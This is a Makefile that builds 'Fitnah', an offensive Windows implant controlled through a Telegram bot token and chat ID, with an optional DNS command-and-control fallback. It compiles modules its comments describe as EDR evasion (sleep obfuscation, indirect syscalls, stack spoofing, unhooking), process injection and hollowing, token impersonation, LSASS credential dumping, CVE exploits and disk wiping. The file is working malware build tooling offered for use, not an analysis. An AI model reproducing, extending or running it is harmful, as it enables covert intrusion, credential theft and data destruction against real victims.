# Fitnah implant Makefile
# Requires: mingw-w64 (apt install mingw-w64)
#           nasm       (apt install nasm)        — for asm/syscalls.asm
#
# Usage:
#   make TOKEN="123:ABC" CHAT_ID="-100999" AGENT_ID="agent-001"
#   make TOKEN="..." CHAT_ID="..." AGENT_ID="..." ARCH=x86
#   make clean

# ── Toolchain ─────────────────────────────────────────────────────────────────
ARCH       ?= x64
ifeq ($(ARCH),x86)
  CC       = i686-w64-mingw32-gcc
  CXX      = i686-w64-mingw32-g++
  AS       = nasm -f win32
  SUFFIX   = _x86
else
  CC       = x86_64-w64-mingw32-gcc
  CXX      = x86_64-w64-mingw32-g++
  AS       = nasm -f win64
  SUFFIX   = _x64
endif

# ── Sleep obfuscation method ──────────────────────────────────────────────────
# SLEEP_OBF=foliage   (default) APC ROP chain + RC4   — most evasive, needs timer queue
# SLEEP_OBF=fluctuate           Sleep() hook + XOR    — simpler, works everywhere
# SLEEP_OBF=ekko                Timer-queue Ekko RC4  — original CS Ekko variant
SLEEP_OBF  ?= foliage

# ── Agent config (required) ───────────────────────────────────────────────────
TOKEN      ?= YOUR_BOT_TOKEN
CHAT_ID    ?= YOUR_CHAT_ID
AGENT_ID   ?= agent-001
SLEEP      ?= 5
JITTER     ?= 20

# ── Output ────────────────────────────────────────────────────────────────────
OUTDIR     = ../build
TARGET     = $(OUTDIR)/fitnah$(SUFFIX).exe

# ── Sources ───────────────────────────────────────────────────────────────────

# Core implant
SRCS_CORE = fitnah_implant.c \
            src/utils.c      \
            src/http.c       \
            src/crypto.c     \
            src/bypass.c     \
            src/commands.c

# Syscall layer (assembled from NASM)
# indirect_syscall.x64.asm — indirect syscall stubs (Havoc-adapted)
# stack_spoof.x64.asm      — gadget-based return address spoofing (Havoc)
ASM_SRCS  = ../fitnah/implant/asm/syscalls.asm              \
            ../fitnah/implant/asm/indirect_syscall.x64.asm  \
            ../fitnah/implant/asm/stack_spoof.x64.asm
ASM_OBJS  = $(OUTDIR)/syscalls.obj              \
            $(OUTDIR)/indirect_syscall.obj      \
            $(OUTDIR)/stack_spoof.obj

# Syscall / injection / loading
SRCS_INJECT = ../fitnah/implant/syscall/indirect_syscall.c       \
              ../fitnah/implant/injection/rdi_loader.c            \
              ../fitnah/implant/injection/ReflectiveLoader.c      \
              ../fitnah/implant/injection/LoadLibraryR.c          \
              ../fitnah/implant/injection/GetProcAddressR.c       \
              ../fitnah/implant/injection/code_cave.c             \
              ../fitnah/implant/injection/process_mirror.c        \
              ../fitnah/implant/process_hollowing.c               \
              ../fitnah/implant/reflective_loader.c               \
              ../fitnah/implant/loader/bof_loader.c               \
              ../fitnah/implant/ApiSetMap.c               \
              ../fitnah/implant/pivot/smb_pivot.c

# Evasion — Havoc evasion + PEzor pe_refresh (all-DLL unhook)
SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c           \
               ../fitnah/implant/evasion/stack_spoof.c            \
               ../fitnah/implant/evasion/hwbp_bypass.c            \
               ../fitnah/implant/evasion/memory_patcher.c         \
               ../fitnah/implant/evasion/unhook.c                 \
               ../fitnah/implant/evasion/anti_analysis.c          \
               ../fitnah/implant/evasion/pe_refresh.c

# fluctuate.cpp (PEzor Sleep-hook XOR obfuscation) compiled with g++
SRCS_FLUCTUATE_CPP = ../fitnah/implant/evasion/fluctuate.cpp
OBJS_FLUCTUATE     = $(OUTDIR)/fluctuate.obj

# Token impersonation (Havoc Token.c / Sliver priv_windows.go — standalone port)
SRCS_TOKEN = ../fitnah/implant/token/token.c

# LSASS dump — nanodump adapter (syscall-based, no MiniDumpWriteDump)
SRCS_NANODUMP = ../fitnah/implant/nanodump/nano_lsass.c

# KaynLdr PIC shellcode loader (Cracked5pider MIT) — indirect-syscall wrapper
SRCS_KAYNLDR = ../fitnah/implant/kaynldr/kaynldr_wrap.c

# Process Ghosting PE executor (hasherezade technique, MIT)
SRCS_GHOST = ../fitnah/implant/injection/process_ghost.c

# Collection / exploitation
SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
            ../fitnah/implant/exploits/cve_exploits.c

# Impact
SRCS_IMPACT = ../fitnah/implant/impact/artifact_wipe.c \
              ../fitnah/implant/impact/disk_wipe.c

SRCS = $(SRCS_CORE) $(SRCS_INJECT) $(SRCS_EVASION) $(SRCS_OPS) $(SRCS_IMPACT) $(SRCS_TOKEN) $(SRCS_NANODUMP) $(SRCS_KAYNLDR) $(SRCS_GHOST)

# ── Compiler flags ────────────────────────────────────────────────────────────
INCLUDES = -Isrc \
           -I../fitnah/implant \
           -I../fitnah/implant/evasion \
           -I../fitnah/implant/injection \
           -I../fitnah/implant/collection \
           -I../fitnah/implant/exploits \
           -I../fitnah/implant/impact \
           -I../fitnah/implant/syscall \
           -I../fitnah/implant/loader \
           -I../fitnah/implant/token \
           -I../fitnah/implant/asm \
           -I../fitnah/implant/nanodump \
           -I../fitnah/implant/kaynldr \
           -I../fitnah/implant/injection

DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
           -DFITNAH_CHAT_ID=$(CHAT_ID)   \
           -DFITNAH_AGENT_ID=$(AGENT_ID) \
           -DFITNAH_SLEEP=$(SLEEP)       \
           -DFITNAH_JITTER=$(JITTER)

# Optional: DNS C2 fallback (set DNS_DOMAIN=c2.example.com to enable)
ifdef DNS_DOMAIN
  DEFINES += -DFITNAH_DNS_DOMAIN=$(DNS_DOMAIN)
endif

# Sleep obfuscation compile-time selection
ifeq ($(SLEEP_OBF),fluctuate)
  DEFINES += -DSLEEP_FLUCTUATE -DFLUCTUATE_NA
else ifeq ($(SLEEP_OBF),ekko)
  DEFINES += -DSLEEP_EKKO
  # Cracked5pider Ekko NtContinue ROP variant (MIT)
  SRCS_EVASION += ../fitnah/implant/evasion/ekko_rop.c
# default: foliage (no extra define needed — always compiled in)
endif

CFLAGS   = -O2 -s -mwindows -static \
           -Wall -Wno-unused-function \
           -Wno-unused-variable

LDFLAGS  = -lwininet -lbcrypt -lntdll -lgdi32 -luser32 -ladvapi32 \
           -lole32 -loleaut32 -lpsapi -ldbghelp -lws2_32 -ldnsapi -lstdc++

# ── Targets ───────────────────────────────────────────────────────────────────
.PHONY: all clean

all: $(OUTDIR) $(ASM_OBJS) $(OBJS_FLUCTUATE)
	$(CC) $(SRCS) $(ASM_OBJS) $(OBJS_FLUCTUATE) \
	    $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
	@echo "[+] Built: $(TARGET) (sleep-obf: $(SLEEP_OBF))"

# fluctuate.cpp requires g++ (uses C++ stdlib headers)
$(OUTDIR)/fluctuate.obj: ../fitnah/implant/evasion/fluctuate.cpp | $(OUTDIR)
	$(CXX) -c $< -O2 -mwindows $(INCLUDES) $(DEFINES) -o $@

$(OUTDIR)/syscalls.obj: ../fitnah/implant/asm/syscalls.asm | $(OUTDIR)
	$(AS) $< -o $@

$(OUTDIR)/indirect_syscall.obj: ../fitnah/implant/asm/indirect_syscall.x64.asm | $(OUTDIR)
	$(AS) $< -o $@

$(OUTDIR)/stack_spoof.obj: ../fitnah/implant/asm/stack_spoof.x64.asm | $(OUTDIR)
	$(AS) $< -o $@

$(OUTDIR):
	mkdir -p $(OUTDIR)

clean:
	rm -f $(OUTDIR)/fitnah*.exe $(OUTDIR)/fitnah*.bin $(OUTDIR)/*.obj
